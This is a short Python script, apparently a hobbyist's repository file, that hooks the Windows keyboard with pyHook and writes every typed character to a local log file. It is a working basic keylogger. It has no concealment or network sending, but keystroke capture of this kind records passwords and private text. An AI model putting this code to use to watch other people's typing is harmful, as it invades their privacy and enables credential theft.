import pyHook , pythoncom , sys , logging

log = "C:\\Users\\sukkritsharma\\Desktop\\Python\\Github\\Python-programs\\log.txt"

def OnKeyboardEvent(event):
	logging.basicConfig(filename=log,level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hook = pyHook.HookManager()
hook.KeyDown = OnKeyboardEvent
hook.HookKeyboard()
pythoncom.PumpMessages()	